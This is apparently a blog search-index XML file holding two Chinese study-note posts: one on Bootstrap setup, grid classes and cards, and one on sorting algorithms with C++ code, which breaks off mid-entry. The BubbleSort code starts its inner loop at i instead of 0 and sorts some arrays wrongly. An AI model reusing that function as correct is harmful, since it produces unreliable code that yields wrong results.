<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BootStrap</title>
      <link href="/posts/24baeadd.html"/>
      <url>/posts/24baeadd.html</url>
      
        <content type="html"><![CDATA[<h1 id="BootStrap"><a href="#BootStrap" class="headerlink" title="BootStrap"></a>BootStrap</h1><blockquote><p><a href="https://www.bootcss.com/">official::Bootstrap中文网</a></p><p><a href=".\9ce61be">text::Html+CSS</a></p></blockquote><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-简单使用"><a href="#1-简单使用" class="headerlink" title="1 简单使用"></a>1 简单使用</h3><blockquote><p>下载和安装：</p><ol><li><a href="https://v5.bootcss.com/docs/getting-started/download/">下载 Bootstrap</a></li><li>解压，在项目的assets中新建一个文件夹叫plugins，然后将解压后的文件改名放进去。</li></ol><p>使用：</p><ul><li><code>bootstrap.css</code>是开发版，便于开发者查看。<code>bootstrap.min.css</code>是生成版，它将代码都压缩在了一行，减少了空间的使用。实际打包上线中引入<code>bootstrap.min.css</code>即可。js同理。</li></ul><p>报错：</p><ul><li><code>Popper__namespace.createPopper is not a function</code>，解决：将引入的bootstrap.js 更改为bootstrap.bundle.js。因为bootstrap.js 没有集成Popper.js 而 bootstrap.bundle.js集成了Popper.js</li></ul></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/favicon.ico&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入css文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;src/assets/plugins/bootstrap/css/bootstrap.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vite App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入js文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;src/assets/plugins/bootstrap/js/bootstrap.bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 类写上bootstrap中的样式类名，css样式将会生效 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger btn-sm&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-博客文档"><a href="#2-博客文档" class="headerlink" title="2 博客文档"></a>2 博客文档</h3><blockquote><p>顶端栏：<a href="https://v5.bootcss.com/docs/components/navbar/">official::Navbar · Bootstrap</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- App.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;container-fluid text-center&quot;&gt;</span><br><span class="line">&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">&lt;Header /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">&lt;Main class=&quot;col-lg-8&quot; /&gt;</span><br><span class="line">&lt;Aside class=&quot;col-lg-4&quot; /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="二、常用属性"><a href="#二、常用属性" class="headerlink" title="二、常用属性"></a>二、常用属性</h2><h3 id="1-栅格参数"><a href="#1-栅格参数" class="headerlink" title="1 栅格参数"></a>1 栅格参数</h3><blockquote><p><a href="https://v5.bootcss.com/docs/layout/grid/">official::Grid system · Bootstrap</a></p><p>结构：<code>container</code>类中包含<code>row</code>类，<code>row</code>类中包含<code>col</code>类。</p><ul><li><code>container</code>默认左右外边距是auto，若要平铺则可以设置为<code>container-fluid</code></li></ul><p>非响应式：盒子不会随页面大小而改变所处位置。非响应式直接<code>col-num</code></p><p>响应式：盒子会随页面大小而改变所处位置。响应式有<code>col-sm-num</code>、<code>col-md-num</code>、<code>col-lg-num</code>等，他们的区别在于改变位置的临界条件不一样。</p><p>列偏移：向后偏移。语法是<code>offset-class-num col-class-num</code></p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用的基础语法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container text-center&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>1 of 2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>2 of 2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>1 of 3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>2 of 3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>3 of 3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 非响应式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-3&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-9&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: green;&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 响应式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-3&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-9&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: green;&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 列偏移 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;offset-sm-5 col-sm-6&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三、组件使用"><a href="#三、组件使用" class="headerlink" title="三、组件使用"></a>三、组件使用</h2><h3 id="1-Card"><a href="#1-Card" class="headerlink" title="1 Card"></a>1 Card</h3><blockquote><p><a href="https://v5.bootcss.com/docs/components/card/">official::Cards · Bootstrap</a></p><p>卡片（card）取代了Bootstrap 3的面板（panels）、wells 以及缩略图（thumbnails）等组件。</p><p>常用card：</p><ul><li><a href="https://v5.bootcss.com/docs/components/card/#列表组">列表组</a></li><li><a href="https://v5.bootcss.com/docs/components/card/#页眉和页脚">页眉和页脚</a></li><li><a href="https://v5.bootcss.com/docs/components/card/#horizontal">横向图片</a></li></ul><p><a href="https://v5.bootcss.com/docs/components/card/#卡片card的样式">样式设置</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页脚若左右存在留白，可以添加下列代码（scoped是vue属性）--&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">div.card&#123;</span><br><span class="line">padding-left: 0px !important;</span><br><span class="line">padding-right: 0px !important;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web前端 </tag>
            
            <tag> web框架 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法进阶</title>
      <link href="/posts/ea53bcd3.html"/>
      <url>/posts/ea53bcd3.html</url>
      
        <content type="html"><![CDATA[<h1 id="算法进阶"><a href="#算法进阶" class="headerlink" title="算法进阶"></a>算法进阶</h1><blockquote><p><a href=".\5751eea2">text::C++</a> </p><p><a href=".\4b0178e0">text::数据结构与算法</a> </p></blockquote><hr><h2 id="一、排序"><a href="#一、排序" class="headerlink" title="一、排序"></a>一、排序</h2><blockquote><p><a href="https://visualgo.net/zh/sorting?slide=1">可视化排序</a></p></blockquote><h3 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1 冒泡排序"></a>1 冒泡排序</h3><blockquote><p>冒泡排序：对一个数组多次重复遍历。它要比较相邻的两项，并且交换顺序排错的项。每对数组进行一次遍历，就会有一个最大项排在了正确的位置。</p><p>改进：加一个flag = False，如果一趟循环未发生任何排序则保持False表示已经排好了序。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; len - i - <span class="number">1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> temp = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2 选择排序"></a>2 选择排序</h3><blockquote><p>同理冒泡，但是一开始不做交换，只记录位置，到单次循环的最后一次才进行交换。就是每次选一个最大或最小的值放到最前面。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> idx = i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; len; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[idx] &gt; arr[j])</span><br><span class="line">            &#123;</span><br><span class="line">                idx = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[idx];</span><br><span class="line">        arr[idx] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3 插入排序"></a>3 插入排序</h3><blockquote><p>维持一个已经排好序的子列表，位置一直在列表前部，然后逐步扩大到这个子列表直到全表，例如抓牌。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[j - <span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> temp = arr[j];</span><br><span class="line">                arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">                arr[j - <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4 希尔排序"></a>4 希尔排序</h3><blockquote><p>因为列表越有序，插入排序比对次数越少，所以希尔排序就是分块的插入排序。希尔排序需要选定一个增量序列，间隔一般为n / 2，例：选1,3,5项或1,4,7项。（不稳定） </p><p>然后第一趟5-排序：每次以5为间隔做插入排序。</p><p>然后第二趟3-排序：每次以3为间隔做插入排序。</p><p>然后第三趟1-排序：每次以1为间隔做插入排序。</p><p>所有序列中最坏的情况：<script type="math/tex">O(n^2)</script></p><p>Hibbard增量序列：</p><ul><li>时间：<script type="math/tex">O(n^{\frac{3}{2}})</script></li><li>模拟平均结果【无人能证明】：<script type="math/tex">O(n^{\frac{5}{4}})</script></li></ul><p>Sedgewick增量序列：</p><ul><li>时间：<script type="math/tex">O(n^{\frac{4}{3}})</script></li><li>模拟平均结果【猜测结果】：<script type="math/tex">O(n^{\frac{7}{6}})</script></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> inc = len / <span class="number">2</span>; inc &gt; <span class="number">0</span>; inc /= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 插入排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = inc; i &lt; len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> key = arr[i];</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line">            <span class="keyword">for</span> (j = i; j &gt;= inc &amp;&amp; key &lt; arr[j - inc]; j -= inc)</span><br><span class="line">                arr[j] = arr[j - inc];</span><br><span class="line">            arr[j] = key;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 每一趟的结果</span></span><br><span class="line">        <span class="comment">//for (int i = 0; i &lt; arr.size(); i++)</span></span><br><span class="line">        <span class="comment">//cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line">        <span class="comment">//cout &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="*5 归并排序"></a>*5 归并排序</h3><blockquote><p> 递归算法，将数据表持续分裂成两半，对两半分别进行归并排序。（稳定）<br> ​​<br> ​时间分裂：$O(logn)$，归并：$O(n)$，总：$O(nlogn)$，会牺牲空间</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> left_size = mid - left + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> right_size = right - mid;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">left_nums</span><span class="params">(left_size)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right_nums</span><span class="params">(right_size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; left_size; i++) &#123;</span><br><span class="line">        left_nums[i] = nums[left + i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; right_size; j++) &#123;</span><br><span class="line">        right_nums[j] = nums[mid + <span class="number">1</span> + j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = left;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; left_size &amp;&amp; j &lt; right_size) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left_nums[i] &lt;= right_nums[j]) &#123;</span><br><span class="line">            nums[k] = left_nums[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            nums[k] = right_nums[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; left_size) &#123;</span><br><span class="line">        nums[k] = left_nums[i];</span><br><span class="line">        i++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (j &lt; right_size) &#123;</span><br><span class="line">        nums[k] = right_nums[j];</span><br><span class="line">        j++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">MergeSort</span>(nums, left, mid);</span><br><span class="line">        <span class="built_in">MergeSort</span>(nums, mid + <span class="number">1</span>, right);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Merge</span>(nums, left, mid, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6 快速排序"></a>6 快速排序</h3><blockquote><p>递归算法，依据一个”中值”数据项把数据表分为两半：小于中值的一半和大于中值的一半，然后再分别进行快速排序。（不稳定）</p><p>时间总能分裂：$O(logn)$，移动：$O(n)$，总：$O(nlogn)$</p><p>若中值偏离中部，时间：$O(n^2)$，因为递归会导致其不如冒泡，</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr, <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> key = arr[left];</span><br><span class="line">    <span class="type">int</span> lp = left;</span><br><span class="line">    <span class="type">int</span> rp = right;</span><br><span class="line">    <span class="keyword">while</span> (lp &lt; rp)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (lp &lt; rp &amp;&amp; arr[rp] &gt;= key)</span><br><span class="line">        &#123;</span><br><span class="line">            rp--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (lp &lt; rp &amp;&amp; arr[lp] &lt;= key)</span><br><span class="line">        &#123;</span><br><span class="line">            lp++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (lp &lt; rp)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">swap</span>(arr[lp], arr[rp]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">swap</span>(arr[lp], arr[left]);</span><br><span class="line">    <span class="built_in">QuickSort</span>(arr, left, lp - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">QuickSort</span>(arr, rp + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-堆排序"><a href="#7-堆排序" class="headerlink" title="*7 堆排序"></a>*7 堆排序</h3><blockquote><p>二叉堆的排序。</p><p>时间：$O(nlogn)$</p></blockquote><h3 id="8-桶排序"><a href="#8-桶排序" class="headerlink" title="*8 桶排序"></a>*8 桶排序</h3><blockquote><p>先遍历一遍数据，找到最小和最大值，然后将其等分成多个桶，然后再遍历一遍，将数据放入对应的桶中，之后对桶做单独排序。（稳定）</p><p>桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。</p><p>时间：<script type="math/tex">O(n ^ 2)</script></p><p>空间：<script type="math/tex">O(n * k)</script></p></blockquote><h3 id="9-基数排序"><a href="#9-基数排序" class="headerlink" title="*9 基数排序"></a>*9 基数排序</h3><blockquote></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="10-计数排序"><a href="#10-计数排序" class="headerlink" title="10 计数排序"></a>10 计数排序</h3><blockquote><ol><li>找出待排序数组中的最大值 <code>maxVal</code> 和最小值 <code>minVal</code>。</li><li>创建一个长度为 <code>maxVal - minVal + 1</code> 的计数数组 <code>countArray</code>，用于统计每个元素的出现次数。</li><li>遍历待排序数组，统计每个元素出现的次数并存储到 <code>countArray</code> 中。</li><li>计算每个元素在排序后的数组中的起始位置（前缀和），修改 <code>countArray</code> 使其表示元素应该放置的位置。</li><li>将 <code>countArray</code>的对应的值依次赋回给原数组。</li></ol><p>时间：<script type="math/tex">O(n + k)</script></p><p>空间：<script type="math/tex">O(n + k)</script></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CountSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> maxVal = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> minVal = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; maxVal)</span><br><span class="line">        &#123;</span><br><span class="line">            maxVal = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; minVal)</span><br><span class="line">        &#123;</span><br><span class="line">            minVal = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">countArray</span><span class="params">(maxVal - minVal + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        countArray[arr[i] - minVal]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; countArray.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; countArray[i]; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            arr[p++] = i + minVal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="二、递归与分治"><a href="#二、递归与分治" class="headerlink" title="二、递归与分治"></a>二、递归与分治</h2><h3 id="1-递归"><a href="#1-递归" class="headerlink" title="1 递归"></a>1 递归</h3><h4 id="1-1-Fibonacci数列"><a href="#1-1-Fibonacci数列" class="headerlink" title="1.1 Fibonacci数列"></a>1.1 Fibonacci数列</h4><blockquote><p><a 